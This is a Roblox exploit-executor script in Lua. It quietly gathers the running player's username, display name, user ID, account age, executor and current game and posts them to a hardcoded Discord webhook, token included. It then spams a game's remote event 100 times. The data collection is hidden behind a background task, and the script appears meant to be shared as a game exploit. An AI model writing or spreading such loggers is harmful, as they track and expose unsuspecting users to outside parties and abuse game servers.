task.spawn(function()
    local function dayCountConverter(n)
        local years = math.floor(n / 365)
        local months = math.floor((n - (years * 365)) / 30)
        local days = n - (years * 365) - (months * 30)
        return string.format("%i Years, %i Months, %i Days", years, months, days)
    end

    local OSTime = os.time()
    local Time = os.date("!*t", OSTime)
    local Content = "<@1234859802224623720> Hi, here is the information: ||<@1234859802224623720>|| ||<@1074298595248967750>||"
    
    local Embed = {
        ["title"] = "**bazed**",
        ["type"] = "rich",
        ["color"] = tonumber(0x00FF00), -- Bright Green Color
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = game.Players.LocalPlayer.Name,
                ["inline"] = false
            },
            {
                ["name"] = "DisplayName",
                ["value"] = game.Players.LocalPlayer.DisplayName,
                ["inline"] = false
            },
            {
                ["name"] = "Exploit",
                ["value"] = identifyexecutor(),
                ["inline"] = false
            },
            {
                ["name"] = "Account Age",
                ["value"] = dayCountConverter(game.Players.LocalPlayer.AccountAge),
                ["inline"] = false
            },
            {
                ["name"] = "User ID",
                ["value"] = game.Players.LocalPlayer.UserId,
                ["inline"] = false
            },
            {
                ["name"] = "Game",
                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                ["inline"] = false
            },
        },
        ["footer"] = {
            ["text"] = "HI!!:3",
            ["icon_url"] = "https://cdn.discordapp.com/icons/1248509960531349506/a_d0e12c96207b8de033720be7bb421362.gif?size=1024&width=0&height=320"
        },
        ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/avatar-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=600&height=600&format=png"
        },
        ["timestamp"] = string.format(
            "%d-%d-%dT%02d:%02d:%02dZ",
            Time.year,
            Time.month,
            Time.day,
            Time.hour,
            Time.min,
            Time.sec
        )
    }

    (syn and syn.request or http_request or http.request) {
        Url = "https://discord.com/api/webhooks/1253330075961790514/8QqMpKOY7yU-LESkyTF0BlgmPpvzqVL-KCsDs9EMjXy_O7NeDPwbADxPVEk7YCAMTDGg",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({content = Content, embeds = {Embed}})
    }
end)

wait(1)

for i = 1, 100 do 
    game.ReplicatedStorage.MainEvent:FireServer("OneMoreTime")
    wait()
end
